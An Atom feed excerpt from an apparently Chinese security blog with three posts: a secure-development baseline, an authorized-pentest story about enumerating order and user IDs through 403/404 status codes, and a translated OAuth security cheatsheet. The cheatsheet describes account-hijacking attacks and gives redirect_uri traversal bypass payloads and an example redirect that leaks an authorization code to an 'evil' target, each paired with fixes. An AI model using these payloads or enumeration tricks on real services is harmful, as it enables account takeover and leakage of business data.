  </entry>
  
  <entry>
    <title>产品设计与开发安全基线</title>
    <link href="http://wismartzy.github.io/2016/09/22/Product-Design-and-Development-Safety-Baseline/"/>
    <id>http://wismartzy.github.io/2016/09/22/Product-Design-and-Development-Safety-Baseline/</id>
    <published>2016-09-22T08:10:45.000Z</published>
    <updated>2017-03-19T06:32:31.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>现在甲方的安全工作很大一部分都是围绕防御来做的，而攻防之间本来就信息不对称，因为攻只需一个点，而防得一个面，迫使防御方需要能早知道攻击者的行为，才能针对性设防，这就使得安全工作经常处于被动局面。结合互联网已公开的一些漏洞来看，很有必要为企业建立一套适合自身业务的安全基线，并严格执行，减少低级漏洞的产生，这样安全工程师才会有更多的精力放在对抗上，从而扭转部分被动局面。</p>
<h1 id="安全基线"><a href="#安全基线" class="headerlink" title="安全基线"></a>安全基线</h1><h2 id="认证与鉴权"><a href="#认证与鉴权" class="headerlink" title="认证与鉴权"></a>认证与鉴权</h2><h3 id="错误提示"><a href="#错误提示" class="headerlink" title="错误提示"></a>错误提示</h3><blockquote>
<p>登录错误必须统一字样，比如用户名或密码错误时，返回“错误的用户名或密码”。</p>
<p>服务端抛出的错误禁止直接返回给接口，仅返回“Error”字样，错误内容打到相关服务日志。</p>
</blockquote>
<a id="more"></a>
<h3 id="登录与注销"><a href="#登录与注销" class="headerlink" title="登录与注销"></a>登录与注销</h3><blockquote>
<p>有登录功能的系统就必须有注销功能。</p>
</blockquote>
<h3 id="后台界面"><a href="#后台界面" class="headerlink" title="后台界面"></a>后台界面</h3><blockquote>
<p>后台页面必须对用户身份和访问权限进行检查</p>
</blockquote>
<h3 id="账号锁定"><a href="#账号锁定" class="headerlink" title="账号锁定"></a>账号锁定</h3><blockquote>
<p>所有提供外网访问功能的系统，必须启用账号登录失败锁定策略（如3分钟20次登录失败，锁定30分钟）</p>
</blockquote>
<h2 id="验证码"><a href="#验证码" class="headerlink" title="验证码"></a>验证码</h2><h3 id="管理系统"><a href="#管理系统" class="headerlink" title="管理系统"></a>管理系统</h3><blockquote>
<p>后台管理系统或其他重要系统登录必须设置验证码</p>
</blockquote>
<h3 id="有效期"><a href="#有效期" class="headerlink" title="有效期"></a>有效期</h3><blockquote>
<p>必须设置有效期，且有效期内仅可使用一次</p>
</blockquote>
<h3 id="发送频率"><a href="#发送频率" class="headerlink" title="发送频率"></a>发送频率</h3><blockquote>
<p>以短信或邮件方式发送验证码时，必须限制同一ID或接受者的验证码发送频率</p>
</blockquote>
<h2 id="会话安全"><a href="#会话安全" class="headerlink" title="会话安全"></a>会话安全</h2><h3 id="会话超时"><a href="#会话超时" class="headerlink" title="会话超时"></a>会话超时</h3><blockquote>
<p>会话token/session必须设有超时机制</p>
</blockquote>
<h3 id="会话更新"><a href="#会话更新" class="headerlink" title="会话更新"></a>会话更新</h3><blockquote>
<p>用户登录成功后，必须更新会话ID，用户注销/重置密码后，必须强制token/session过期。</p>
</blockquote>
<h2 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie"></a>Cookie</h2><h3 id="HttpOnly"><a href="#HttpOnly" class="headerlink" title="HttpOnly"></a>HttpOnly</h3><blockquote>
<p>cookie参数中session id等认证相关的字段必须设置HttpOnly</p>
<p>HTTPS传输必须为cookie设置secure</p>
</blockquote>
<h2 id="上传下载"><a href="#上传下载" class="headerlink" title="上传下载"></a>上传下载</h2><h3 id="文件判断"><a href="#文件判断" class="headerlink" title="文件判断"></a>文件判断</h3><blockquote>
<p>对上传文件后缀进行白名单限制，严格校验文件内容与类型是否匹配</p>
</blockquote>
<h3 id="目录跳转"><a href="#目录跳转" class="headerlink" title="目录跳转"></a>目录跳转</h3><blockquote>
<p>禁止客户端自定义文件下载路径（如：使用../../../../进行跳转）</p>
</blockquote>
<h3 id="目录权限"><a href="#目录权限" class="headerlink" title="目录权限"></a>目录权限</h3><blockquote>
<p>存储上传文件的目录必须禁止脚本执行权限</p>
</blockquote>
<h2 id="传输安全"><a href="#传输安全" class="headerlink" title="传输安全"></a>传输安全</h2><h3 id="参数提交"><a href="#参数提交" class="headerlink" title="参数提交"></a>参数提交</h3><blockquote>
<p>禁止通过 HTTP GET 方式提交不安全算法处理过的用户密码</p>
</blockquote>
<h3 id="明文传输"><a href="#明文传输" class="headerlink" title="明文传输"></a>明文传输</h3><blockquote>
<p>禁止通过 HTTP 明文传输用户登录密码、支付密码、银行卡号等敏感数据</p>
</blockquote>
<h3 id="支付安全"><a href="#支付安全" class="headerlink" title="支付安全"></a>支付安全</h3><blockquote>
<p>禁止在支付密码的传输过程中使用不安全算法</p>
</blockquote>
<h2 id="存储安全"><a href="#存储安全" class="headerlink" title="存储安全"></a>存储安全</h2><h3 id="敏感数据存储"><a href="#敏感数据存储" class="headerlink" title="敏感数据存储"></a>敏感数据存储</h3><blockquote>
<p>禁止数据库、日志文件中明文存储用户登录密码、支付密码、银行卡号、身份证号码等敏感数据</p>
</blockquote>
<h2 id="日志审计"><a href="#日志审计" class="headerlink" title="日志审计"></a>日志审计</h2><h3 id="审计内容"><a href="#审计内容" class="headerlink" title="审计内容"></a>审计内容</h3><blockquote>
<p>自建用户系统，必须记录：时间/用户ID/操作/结果/IP等信息</p>
</blockquote>
<h3 id="日志清除"><a href="#日志清除" class="headerlink" title="日志清除"></a>日志清除</h3><blockquote>
<p>除审计用户外，其他人员不应该具备日志修改、删除、清空的权限，必须记录清空日志的行为</p>
</blockquote>
<h3 id="日志存储"><a href="#日志存储" class="headerlink" title="日志存储"></a>日志存储</h3><blockquote>
<p>禁止将日志直接保存在可被浏览器访问到的WEB目录中</p>
</blockquote>
<h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><h3 id="后门"><a href="#后门" class="headerlink" title="后门"></a>后门</h3><blockquote>
<p>禁止在代码中留置后门</p>
</blockquote>
<h1 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h1><p>基线制定事简单，关键在于如何推动研发遵循，而这个问题又可以开一篇文章聊了。</p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul>
<li>VIP产品设计与开发红线 v2.0</li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;概述&quot;&gt;&lt;a href=&quot;#概述&quot; class=&quot;headerlink&quot; title=&quot;概述&quot;&gt;&lt;/a&gt;概述&lt;/h1&gt;&lt;p&gt;现在甲方的安全工作很大一部分都是围绕防御来做的，而攻防之间本来就信息不对称，因为攻只需一个点，而防得一个面，迫使防御方需要能早知道攻击者的行为，才能针对性设防，这就使得安全工作经常处于被动局面。结合互联网已公开的一些漏洞来看，很有必要为企业建立一套适合自身业务的安全基线，并严格执行，减少低级漏洞的产生，这样安全工程师才会有更多的精力放在对抗上，从而扭转部分被动局面。&lt;/p&gt;
&lt;h1 id=&quot;安全基线&quot;&gt;&lt;a href=&quot;#安全基线&quot; class=&quot;headerlink&quot; title=&quot;安全基线&quot;&gt;&lt;/a&gt;安全基线&lt;/h1&gt;&lt;h2 id=&quot;认证与鉴权&quot;&gt;&lt;a href=&quot;#认证与鉴权&quot; class=&quot;headerlink&quot; title=&quot;认证与鉴权&quot;&gt;&lt;/a&gt;认证与鉴权&lt;/h2&gt;&lt;h3 id=&quot;错误提示&quot;&gt;&lt;a href=&quot;#错误提示&quot; class=&quot;headerlink&quot; title=&quot;错误提示&quot;&gt;&lt;/a&gt;错误提示&lt;/h3&gt;&lt;blockquote&gt;
&lt;p&gt;登录错误必须统一字样，比如用户名或密码错误时，返回“错误的用户名或密码”。&lt;/p&gt;
&lt;p&gt;服务端抛出的错误禁止直接返回给接口，仅返回“Error”字样，错误内容打到相关服务日志。&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
    
      <category term="安全" scheme="http://wismartzy.github.io/tags/%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>会说话的状态码</title>
    <link href="http://wismartzy.github.io/2016/09/09/hui-shuo-hua-de-zhuang-tai-ma/"/>
    <id>http://wismartzy.github.io/2016/09/09/hui-shuo-hua-de-zhuang-tai-ma/</id>
    <published>2016-09-09T15:33:23.000Z</published>
    <updated>2017-03-19T06:32:50.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h2><p>我在某次授权渗透时候碰到的场景：</p>
<p>渗透对象：</p>
<blockquote>
<p>某电商 APP</p>
</blockquote>
<p>目标缺陷：</p>
<blockquote>
<p>API 设计不合理导致可泄露业务相关敏感信息</p>
</blockquote>
<p>测试过程：</p>
<p>APP 含有购买功能，购买后会为订单生成订单号，此处订单号并不连续且为纯数字。为了进行越权测试，我注册了两个账户，分别进行一次购买行为。测试时我用 Burp 截取查看订单功能的数据包，并修改 URL 中的订单号为任意数字，向服务端再次提交请求，经过多次测试，发现服务端的返回请求状态码不是 <code>403</code> 就是 <code>404</code>，基本可以确定此处不存在订单越权查看问题，但是根据服务端返回的状态码，不难推测出如下结论：</p>
<blockquote>
<p>404 即该订单号对应的订单不存在</p>
<p>403 即该订单存在，但不允许我查看</p>
</blockquote>
<a id="more"></a>
<h2 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h2><p>那么可以怎么利用呢？订单属于商业敏感数据，APP 开发者当然不愿意自己的实际订单数据被用户或竞争对手拿到，在这里我可以根据遍历订单编号得到的服务端返回状态码（<code>403</code> 即订单存在）确定该 APP 的实际订单量。</p>
<p>类似场景还有，当获取用户个人主页时候，Restful 接口类似如下：</p>
<blockquote>
<p>GET /users/123/profile HTTP/1.1</p>
<p>Host: target.com</p>
</blockquote>
<p>修改 <code>123</code> 为其他数字，根据服务端返回状态码是否为 <code>403</code> 即可判断对应用户是否存在，在确定注册用户 id 递增的情况下，那么可以在月初注册一个账户拿到用户 id，记为 <code>num1</code>，月末注册另一账户并拿到用户 id，记为 <code>num2</code>，再遍历下刚刚的接口，就能筛选出 <code>num1</code>、<code>num2</code> 之间的用户数量了，也即为一个月的新增用户数。</p>
<p>对创业公司来说，倘若投资人以某种渠道拿到了你们产品的真实注册用户数和订单量，你觉得他还会在乎你 PPT 上的内容吗？当然，这有点夸张了XD。</p>
<h2 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h2><p>在我看来，当一个用户访问的资源不属于自己时，服务端返回 <code>403</code> 和 <code>404</code> 都是可以的，<code>403</code> 指 Forbidden，禁止用户访问不属于自己的资源，<code>404</code> 指 Not Found，用户不能看到不属于自己的资源，也能解释通。另外，也有服务端会返回 <code>401</code>，<code>401</code> 指 Unauthorized，用户未授权访问不属于自己的资源，依然合理。</p>
<p>那到底该用哪一个呢？去翻了下 <code>RFC2616</code>，对 <code>403</code> 状态码的解释里有这么一句：</p>
<blockquote>
<p>If the server does not wish to make this information available to the client, the status code 404 (Not Found) can be used instead.</p>
</blockquote>
<p>大概意思就是，只要服务端不想暴露信息给客户端，接口都统一返回 <code>404</code>，完整部分可以看下图：</p>
<p><img src="/images/rfc-1.png" alt="status code rfc"></p>
<p>针对上面我碰到的场景来说，总结一句话就是</p>
<blockquote>
<p>未授权用户访问有效资源时，服务端统一返回 404 更安全</p>
</blockquote>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x01&quot;&gt;&lt;a href=&quot;#0x01&quot; class=&quot;headerlink&quot; title=&quot;0x01&quot;&gt;&lt;/a&gt;0x01&lt;/h2&gt;&lt;p&gt;我在某次授权渗透时候碰到的场景：&lt;/p&gt;
&lt;p&gt;渗透对象：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;某电商 APP&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;目标缺陷：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;API 设计不合理导致可泄露业务相关敏感信息&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;测试过程：&lt;/p&gt;
&lt;p&gt;APP 含有购买功能，购买后会为订单生成订单号，此处订单号并不连续且为纯数字。为了进行越权测试，我注册了两个账户，分别进行一次购买行为。测试时我用 Burp 截取查看订单功能的数据包，并修改 URL 中的订单号为任意数字，向服务端再次提交请求，经过多次测试，发现服务端的返回请求状态码不是 &lt;code&gt;403&lt;/code&gt; 就是 &lt;code&gt;404&lt;/code&gt;，基本可以确定此处不存在订单越权查看问题，但是根据服务端返回的状态码，不难推测出如下结论：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;404 即该订单号对应的订单不存在&lt;/p&gt;
&lt;p&gt;403 即该订单存在，但不允许我查看&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
    
      <category term="安全" scheme="http://wismartzy.github.io/tags/%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>OAuth Security Cheatsheet</title>
    <link href="http://wismartzy.github.io/2016/08/21/OAuth-Security-Cheatsheet/"/>
    <id>http://wismartzy.github.io/2016/08/21/OAuth-Security-Cheatsheet/</id>
    <published>2016-08-21T04:53:56.000Z</published>
    <updated>2017-03-19T06:32:14.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="State-Of-The-Art-OAuth2-Homakov-Edition"><a href="#State-Of-The-Art-OAuth2-Homakov-Edition" class="headerlink" title="State-Of-The-Art OAuth2 Homakov Edition"></a>State-Of-The-Art OAuth2 Homakov Edition</h1><p>考虑到官方OAuth2规范的脆弱性以及易受攻击的服务提供商和客户端的集成数，有了满足<strong>secure-by-default</strong>原则的OAuth版本-Homakov</p>
<p>CSRF防护初始请求<code>/connect/provider</code>的时候，总是使用和需要<code>state</code>参数，不允许动态的<code>redirect_uri</code>，默认不允许<code>response_type=hash</code>（以前是<code>token</code>），废弃<code>refresh_token</code>和<code>token</code>，而不是用<code>appsecret_proof</code>去认证每个<code>access_token</code>，仔细检查用户想要连接的服务提供商账户，<code>access_token</code>永不过期（把它当做公开的<code>user_id</code>）</p>
<p>1、用户点击连接服务提供商的按钮，无论是发起一个<code>POST</code>表单提交（受<code>CSRF Token</code>防护的）到<code>/connect/provider_name</code>，还是由<code>GET</code>导航到<code>/connect/provider?csrf_token=TOKEN</code>，初始步骤一定要受<code>CSRF</code>防护，它不应该被来自其他源的连接触发，必须有来自于用户的明确的确认。</p>
<p>2、在服务端<code>/connect/provider</code>客户端的控制器应该确认<code>csrf_token</code>和来自于<code>session</code>里的<code>token</code>一致，然后生成<code>state token</code>（CSRF Token，确保OAuth流程完整性），并命名为<code>&lt;provider&gt;-state</code>存储在<code>session</code>里。然后跳转到<code>provider.com/oauth/authorize?client_id=CLIENT_ID&amp;redirect_uri=CLIENT/callback&amp;state=STAT</code>，<code>scope</code>参数是可选的（应该仅仅允许被认证过的客户端接触一些关键的作用域）</p>
<a id="more"></a>
<p>3、服务提供商检查<code>redirect_uri</code>是否在重定向URI的白名单中（主机，路径，查询参数，<code>hash</code>必须是静态的）。每一个<code>redirect_uri</code>它不能是一个参数，还必须要有响应的返回类型，默认是<code>query</code>，移动app是<code>hash</code>。<code>state</code>参数必须由服务供应商要求（尽管规范上说该参数是可选的—对大多数开发者来说这就是不需要的代名词）。</p>
<p>4、用户在服务提供商域下看到同意/拒绝按钮，在点击同意按钮后受<code>CSRF Token</code>防护的<code>POST</code>表单被提交到相同的<code>URL</code>（不要像<code>Outlook</code>或<code>Doorkeeper</code>或者在授权的时候<code>CSRF</code>攻击服务提供商）。</p>
<p>5、<code>response_type</code>为<code>query</code>时候重定向到<code>CLIENT/callback?access_token=TOKEN&amp;state=STATE</code>（所有的<code>token</code>被存储在中央服务器，并且每个API请求用<code>appsecret_proof</code>签名），<code>response_type</code>为<code>hash</code>的时候会重定向到<code>CLIENT/callback#access_token=TOKEN&amp;state=STATE</code>（所有的<code>token</code>被存储在本地应用里，并不需要<code>appsecret_proof</code>）。这两种情况下客户端都一定要检查<code>STATE</code>是否等于来自<code>season</code>的<code>provider-state</code>。</p>
<p>6、为什么<code>access_token</code>从不过期？因为我们不再需要<code>refresh_token/code</code>。用<code>refresh_token</code>攻击者能使用<code>access_token</code>获得一个窗口去发送垃圾邮件或者下载所有受害者的社交图片。仅当<code>access_token</code>过期，根据规范，客户端应该使用<code>refresh_token</code>和<code>client_secret</code>去获取一个新的<code>token</code>。除了这个场景，我们将需要最早由Facebook引入的<code>appsecret_proof</code>。如果<code>response_type</code>为<code>query</code>的时候，<code>token</code>被返回，那么每一个到服务提供商的请求一定要有<code>access_token</code>和<code>appsecret_proof=hash_hmac(&#39;sha256&#39;, $access_token, $client_secret);</code>。现在如果攻击者泄露<code>access_token</code>，<code>token</code>毫无价值。即使他们偷了你的<code>client_secret</code>，你也能很简单的换掉。</p>
<p>7、可选的，但是是推荐的。在连接账户之前，你应该询问用户是否要连接到例如<code>myfbemail@email.com</code>的Facebook账户。因为有很多的攻击比如<code>cookie forcing</code>, <code>login/logout CSRF</code>, <code>RECONNECT</code>能够静默将用户登录到服务提供商的恶意账户里。</p>
<h1 id="关于"><a href="#关于" class="headerlink" title="关于"></a>关于</h1><p>这个文档描述常见的<code>OAuth/Single Sign On/OpenID</code>相关的漏洞。很多跨站交互容易受到不同类型的泄露和劫持。</p>
<p>Hacker和开发者都能通过阅读它收获益处。</p>
<p>OAuth是一个重要的功能，他负责对访问用户敏感数据进行认证和授权。糟糕的实现OAuth是一个接管账户的可靠方式，不像XSS，它很容易利用，但是对受害者来说很难避免（NoScript不会有作用，因为这个攻击不需要JavaScript）。<br>由于OAuth，许多初创公司包括SoundCloud，Foursquare，Airbnb，About.me、Bit.ly、Pinterest、Digg，StumbleUpon，Songkick有帐户劫持漏洞。并且很多网站仍然是脆弱的。我们的动机是让人们意识到“社交登录”的风险，我们鼓励你非常小心地使用OAuth。<br>这个小抄并不会解释OAuth是怎样的工作流程，请自行去<a href="http://oauth.net" target="_blank" rel="external">官方站点</a>查看</p>
<h1 id="授权code流"><a href="#授权code流" class="headerlink" title="授权code流"></a>授权code流</h1><h2 id="通过连接攻击者提供的服务提供商账户导致客户端账户被劫持"><a href="#通过连接攻击者提供的服务提供商账户导致客户端账户被劫持" class="headerlink" title="通过连接攻击者提供的服务提供商账户导致客户端账户被劫持"></a>通过连接攻击者提供的服务提供商账户导致客户端账户被劫持</h2><p>正如<a href="http://homakov.blogspot.hk/2012/07/saferweb-most-common-oauth2.html" target="_blank" rel="external">最常见的OAuth2漏洞</a>里面说的，换句话说就是<code>CSRF</code>。</p>
<p>服务提供商通过重定向用户代理（译者注：浏览器）到<code>SITE/oauth/callback?code=CODE</code>来返回授权code，现在客户端必须发送授权code和客户端凭证、<code>redirect_uri</code>一起来获得<code>access_token</code></p>
<p>如果客户端执行的时候没有使用<code>state</code>参数去减轻<code>CSRF</code>问题，我们可以很容易的使用我们的服务提供商账户连接受害者的客户端账户。</p>
<p><img src="/images/oath-1.png" alt="oath-1"></p>
<p>它对有社交登录和有能力为已存在的主账户添加一个登陆选项的客户端有用（下面是来自<code>pinterest.com</code>的截图）</p>
<p><img src="/images/oath-2.png" alt="oath-2"></p>
<p><img src="/images/oath-21.png" alt="oath-21"></p>
<p><strong>修复：</strong>在发送用户跳转到服务提供商的请求时生成一个随机值并且保存在<code>cookie</code>或者<code>session</code>里面，当用户从服务提供商返回的时候确认你收到的<code>state</code>参数值和之前保存在<code>cookies</code>或<code>session</code>里面的那个值相等。</p>
<p><strong>缺陷：</strong>由于<a href="https://github.com/mkdynamic/omniauth-facebook/blob/c277322722b6e8fba1eadf9de74927b73fbb86ea/lib/omniauth/strategies/facebook.rb#L105" target="_blank" rel="external">以前的代码</a>利用用户提供的<code>/connect?state=user_supplied</code>而不是生成一个随机的，所以在<a href="https://github.com/mkdynamic/omniauth-facebook/wiki/CSRF-vulnerability:-CVE-2013-4562" target="_blank" rel="external">omniauth</a>这种情况下是有可能控制固定<code>state</code>的。</p>
<p>这是另外一个OAuth设计问题 - 有时候开发者想要使用<code>state</code>表达出自己的目的，尽管你能同时发送这样的值<code>state=welcome_landing.random_nonce</code>但是毫无疑问它看起来很丑陋，一个简洁的方案是使用<a href="https://tools.ietf.org/html/draft-bradley-oauth-jwt-encoded-state-00" target="_blank" rel="external">JSON Web Token作为state</a>。</p>
<h2 id="服务提供商乱用固定会话导致客户端账户劫持"><a href="#服务提供商乱用固定会话导致客户端账户劫持" class="headerlink" title="服务提供商乱用固定会话导致客户端账户劫持"></a>服务提供商乱用固定会话导致客户端账户劫持</h2><p>尽管客户端合理的校验了<code>state</code>参数，我们仍然可能在服务提供商替换认证<code>cookie</code>为攻击者的账户：在登录（VK, Facebook）时候使用<code>CSRF</code>，头部注入，或者<code>cookie forcing or tossing</code>。</p>
<p>然后我们仅仅载入一个<code>GET</code>请求触发连接（<code>omniauth中/user/auth/facebook</code>），Facebook将返回攻击者的用户信息（uid=攻击者的uid）并且它最终将连接攻击者的服务提供商账户到受害者的客户端账户。</p>
<p><strong>修复：</strong>确保添加一个新的社交连接需要一个有效的<code>csrf_token</code>，因为这是不可能触发<code>CSRF</code>的过程。理想情况下，使用<code>POST</code>而不是<code>GET</code>。</p>
<p>Facebook拒绝从他们那边修复登录时的<code>CSRF</code>，所以很多库仍然易受攻击。不要期望服务提供商给你可靠的认证数据。</p>
<h2 id="泄露授权code导致账户劫持"><a href="#泄露授权code导致账户劫持" class="headerlink" title="泄露授权code导致账户劫持"></a>泄露授权code导致账户劫持</h2><p>OAuth文档很清楚的指明了服务提供商必须检查第一次的<code>redirect_uri</code>等于客户端用来获取<code>access_token</code>的<code>redirect_uri</code>。我们并没有真正的检查它因为它看起来很难出错。令人惊讶的是很多服务提供商错了：Foursquare (reported), VK (report, in Russian), Github (可能泄露私有项目的tokens), 和很多“自研”的单点登录插件。</p>
<p>攻击方式很直接：在客户端域内找到一个漏洞页面，插入跨域图片或者一个链接到你的网站，然后使用这个页面地址作为<code>redirect_uri</code>。当受害者载入构造好的URL，它将引导受害者到<code>leaking_page?code=CODE</code>，并且受害者的用户代理将授权code暴露在http头的Referrer字段。</p>
<p><img src="/images/auth-3.png" alt="auth-3"></p>
<p>现在你能重新使用泄露的授权code和实际的<code>redirect_uri</code>去登录受害者账户。</p>
<p><strong>修复：</strong>灵活的<code>redirect_uri</code>是一个不好的做法，但是，如果你需要它，那么每次请求授权code的时候存储<code>redirect_uri</code>并且在<code>access_token</code>生成的时候校验它。</p>
<h1 id="隐式流"><a href="#隐式流" class="headerlink" title="隐式流"></a>隐式流</h1><h2 id="在打开跳转链接的时候泄露access-token-signed-request"><a href="#在打开跳转链接的时候泄露access-token-signed-request" class="headerlink" title="在打开跳转链接的时候泄露access_token/signed_request"></a>在打开跳转链接的时候泄露access_token/signed_request</h2><p>这是过去被媒体宣传为“重定向覆盖”的攻击，但事实上它已经被发现很多年了。你仅需要找到一个客户端域名或者其子域名的重定向漏洞，把该地址作为<code>redirect_uri</code>并且替换<code>response_type</code>为<code>token</code>,<code>signed_request</code>发送出去，302跳转将会保留<code>#fragment</code>，而攻击者的Javascript代码可以访问<code>location.hash</code>（即为url的<code>fragment</code>字段值）。</p>
<p>泄露<code>access_token</code>能够被用来发送垃圾邮件和破坏你的隐私。此外，泄露的<code>signed_request</code>是更敏感的数据。通过在你完全授权用Facebook登录的客户端找到一个重定向漏洞。</p>
<p><strong>修复：</strong>在应用的设置里仅允许一个<code>redirect_uri</code>白名单。</p>
<p><img src="/images/auth-4.png" alt="auth-4"></p>
<h2 id="使用攻击者的客户端发出的access-token导致账户劫持"><a href="#使用攻击者的客户端发出的access-token导致账户劫持" class="headerlink" title="使用攻击者的客户端发出的access_token导致账户劫持"></a>使用攻击者的客户端发出的access_token导致账户劫持</h2><p>也被称为<a href="http://homakov.blogspot.com/2012/08/oauth2-one-accesstoken-to-rule-them-all.html" target="_blank" rel="external">One Token to Rule Them All</a>，这个bug与移动端和客户端应用有关，因为他们经常直接使用用户提供的<code>access_token</code>。</p>
<p>想象一下，用户有很多“授权秘钥”并且给任何他想要登录的新网站一个秘钥。一个恶意的站点管理员能够使用用户的的秘钥去登陆他的客户已经登录过的其他站点。</p>
<p><img src="/images/auth-5.png" alt="auth-5"></p>
<p><strong>修复：</strong> 在接受用户提供的<code>access_token</code>前检查下它是否是你的<code>client_id</code>在<code>https://graph.facebook.com/app?fields=id&amp;access_token=TOKEN</code>生成的。</p>
<h1 id="传输和JS-SDK漏洞"><a href="#传输和JS-SDK漏洞" class="headerlink" title="传输和JS SDK漏洞"></a>传输和JS SDK漏洞</h1><p>为了更好的支持客户端应用（或者浏览器应用），一些OAuth2服务提供商添加了一些隐式流外的自定义规格变体。涉及到一个代理/中继页作为访问<code>token</code>的路由。这个代理和客户端应用的页面通讯或者通过标准的HTML5的<code>postMessage API</code>，或者使用旧的方式：指定<code>window name</code>和url（也被叫做<code>Fragment</code>传输），还有Adobe Flash的<code>LocalConnection API</code></p>
<p>不管选择的方法是什么，确保代理呢个个仅和目标源交换信息是很重要的，不接受来自伪造的应用的页面，并且最终去确认这些客户端的检查和服务端的检查是一致的。客户端安全传输失败通常导致下面两种问题：</p>
<ul>
<li>泄露数据给攻击者（<a href="http://prosecco.gforge.inria.fr/CVE/Facebook_JS_2012.html" target="_blank" rel="external">授权和认证绕过</a>）</li>
<li>信任来自攻击者的数据（<a href="https://people.eecs.berkeley.edu/~dawnsong/papers/2010%20emperors%20new%20api.pdf" target="_blank" rel="external">session固话攻击</a>）</li>
</ul>
<p>另外，现代web应用趋向于丰富的javascript前端库，以及不安全的客户端通讯导致超越OAuth本身的更严重的攻击。</p>
<p><strong>修复：</strong></p>
<ul>
<li>完全禁用所有旧的客户端通讯方法（<code>Flash</code>或者<code>Fragment</code>），使用<code>postMessage</code></li>
<li>检查所有进和出的消息的源，仅允许目标应用的域</li>
<li>确保所有客户端源检查和服务端源检查一致</li>
<li>在与另一方开始数据传输前用加密的随机数校验</li>
</ul>
<h1 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h1><p>##泄露客户端凭证威胁<br>客户端凭证不再像它听起来那样重要。你唯一能做的是使用泄露的页面泄露授权code，然后手动为它们获取<code>access_token</code>（提供泄露的<code>redirect_uri</code>，而不是实际的）。尽管这个威胁当服务提供商使用静态<code>redirect_uri</code>的时候能够得到缓解。</p>
<h2 id="session固话（OAuth1-0）"><a href="#session固话（OAuth1-0）" class="headerlink" title="session固话（OAuth1.0）"></a>session固话（OAuth1.0）</h2><p>OAuth2和OAuth1最主要的不同在于你传给服务提供商的参数。第一个版本里你发送所有的参数给服务提供商然后获取对应<code>request_token</code>。接着你引导用户到<code>provider?request_token=TOKEN</code>，然后在授权用户完后重定向返回到<code>client/callback?request_token=SAME_TOKEN</code>。</p>
<p>在这里固话的意思是我们能欺骗用户接受我们提供的发送给我们的Token1，然后在客户端的<code>callback</code>里重用Token1</p>
<p>这个不是严重的漏洞，因为主要是基于网络钓鱼。<a href="http://homakov.blogspot.jp/2014/01/token-fixation-in-paypal.html" target="_blank" rel="external">FYI Paypal express checkout has this bug</a></p>
<h2 id="中间服务提供商"><a href="#中间服务提供商" class="headerlink" title="中间服务提供商"></a>中间服务提供商</h2><p>许多初创公司都用Facebook连接，与此同时，他们也是服务提供商。作为服务提供商，他们必须重定向用户到第三方站点，这些“开放的重定向”你没法修复。它使得这个链成为可能：Facebook -&gt; 中间服务提供商 -&gt; 客户端的回调，导致FB的<code>token</code>泄露。</p>
<p>要修复这个问题，Facebook在回调URL的后面添加<code>#_=_</code>。你调用的时候应该去掉<code>fragment</code>来防止泄露。以这种方式重定向：<br><code>Location: YOUR_CLIENT/callback?code=code#</code></p>
<h2 id="用技巧绕过redirect-uri校验"><a href="#用技巧绕过redirect-uri校验" class="headerlink" title="用技巧绕过redirect_uri校验"></a>用技巧绕过redirect_uri校验</h2><p>如果你被允许设置子目录，下面是目录遍历的技巧：</p>
<ol>
<li>/old/path/../../new/path</li>
<li>/old/path/%2e%2e/%2e%2e/new/path</li>
<li>/old/path/%252e%252e/%252e%252e/new/path</li>
<li>/new/path///../../old/path/</li>
<li>/old/path/.%0a./.%0d./new/path (For Rails, because it strips \n\d\0)</li>
</ol>
<h2 id="重放攻击"><a href="#重放攻击" class="headerlink" title="重放攻击"></a>重放攻击</h2><p>授权code通过<code>GET</code>发送，并将存储在日志中，服务提供商一定要在使用或过期5分钟内删除它。</p>
<h2 id="开放的重定向泄露授权code"><a href="#开放的重定向泄露授权code" class="headerlink" title="开放的重定向泄露授权code"></a>开放的重定向泄露授权code</h2><p>通常你需要<code>referrer</code>泄露页面去泄露查询参数。这有两种通过开放的重定向来实现的技巧：</p>
<ul>
<li>当重定向使用<code>&lt;meta&gt;</code>标签而不是302状态和<code>Location</code>头的话，它将泄露跳转页面的<code>referrer</code>到下一个请求中。</li>
<li>当你管理<code>redirect_uri</code>的尾部去添加<code>%23</code>（#），它将导致在<code>fragment</code>位置发送授权code<code>Location: http://CLIENT/callback/../open_redirect?to=evil#&amp;code=CODE</code></li>
</ul>
<h1 id="贡献者"><a href="#贡献者" class="headerlink" title="贡献者"></a>贡献者</h1><p>@homakov(<a href="https://twitter.com/homakov" target="_blank" rel="external">https://twitter.com/homakov</a>), @isciurus(<a href="https://twitter.com/isciurus" target="_blank" rel="external">https://twitter.com/isciurus</a>) and you?</p>
<hr>
<blockquote>
<p>原文地址：<a href="http://www.oauthsecurity.com" target="_blank" rel="external">http://www.oauthsecurity.com</a></p>
</blockquote>
]]></content>
    
    <summary type="html">
    
